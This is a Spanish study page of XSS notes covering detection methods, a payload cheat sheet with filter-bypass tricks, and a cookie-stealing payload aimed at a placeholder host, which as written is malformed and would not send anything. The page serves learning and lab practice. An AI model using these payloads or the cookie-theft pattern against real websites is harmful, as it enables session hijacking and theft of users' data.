---
description: Cross-Site-Scripting inyección de JavaScript
---

# XSS

Puede ser en formularios de búsqueda, a través de peticiones GET o POST, cualquier punto en el que puedas mandar información puede ser potencialmente vulnerable.

## Tipos

### Reflected XSS

Sólo afecta a la víctima directa que pulsa un enlace en particular que ha sido inyectado.

### Stored XSS

Afecta a cualquier persona que acceda al lugar donde el código ha sido inyectado y almacenado, por ejemplo un foro.

## Detección

La forma más típica de detectarlo sin protecciones de ningún tipo es

```
<script>alert()</script>
```

La idea es comprobar si cualquier parámetro modificable se ve reflejado de alguna manera en la web.

* Formularios de búsqueda
* Envío de datos (Comentarios, Feedbacks, etc...)
* Parámetro modificable en la URL

Para encontrarlo puedes:

* Detectar cualquier formulario de introducción de datos por la web.
* Navegar con algún proxy como Burpsuite y comprueba todas las peticiones que se van realizando, si alguno de los parámetros puede ser modificado.
* Mira los códigos fuentes y las respuestas, busca parámetros que se hayan modificado, scripts internos de la página, archivos .js que afecten a esos parámetros de entrada.
* Mi más sincera recomendación es que si no encontráis nada volváis a repasar todos los puntos uno por uno y poco a poco.

¿Qué hacer una vez encontrado un potencial XSS?

* ¿Qué tags permite introducir?
* ¿De qué eventos dispones?
* ¿Sabes las medidas de protección?
* ¿Sabes la sintaxis?
* ¿Sabes dónde estás insertando el Payload y como escapar o aprovecharlo?

Una vez has sacado todos los datos posibles consiste en hacer un puzzle con todo ello, y de esta manera crear un Payload adecuado.

Con respecto a los Tags y eventos os recomiendo ver [XSS en Portswigger](../../../portswigger/cross-site-scripting-labs.md#reflected-xss-into-html-context-with-most-tags-and-attributes-blocked)

## Cheatsheet

{% embed url="https://portswigger.net/web-security/cross-site-scripting/cheat-sheet" %}
Cheatsheet de Portswigger
{% endembed %}

### Sin protección ni codificación

```
<script>alert()</script>
<svg onload=alert()>
<img src="" onerror=alert()>
javascript:alert() #Dentro de un href
```

### Codificado en HTML

```
#Si en el body tenemos la directiva "ng-app=" estamos ante AngularJS
{{$on.constructor('alert()')()}}

#Comillas dobles
&apos;-alert()-&apos;
```

### Escapar el escape (\\)

```
#En ocasiones algunos caracteres los escapa pero si no escapan el escape "\" puede escaparlo
#EJEMPLO: Si escapa las comillas dobles \", puedes escaparlo \\"
```

### Sólo escapa la primera coincidencia

```
#En ocasiones solo va a reemplazar la primera coincidencia
#EJEMPLO: Si escapa los primeros <>
<><img src="" onerror=alert()>
```

### Borra \<script>

```
<scr<script>ipt>alert()</scr</script>ipt>
#Al borrar <script> le llega el payload:
<script>alert()</script>
```

## Cookies

```
<img src=x onerror="http://dirección/?c="+btoa(document.cookie) />
```

## Recomendación

Aprende a fondo Javascript:

* Añadir elementos al DOM
* Realizar peticiones POST
* Angular, Ajax...
* Sintaxis

## Practicar

* Máquinas "[XSS](../../../portswigger/cross-site-scripting-labs.md)" de Portswigger \[Acceso 16/11/2021]

> \*Disclaimer: Este manual está realizado en base a lo que voy aprendiendo, si parte de la información que comparto no es correcta estaré encantado de que te pongas en contacto conmigo para hacérmelo saber y poder modificarlo.
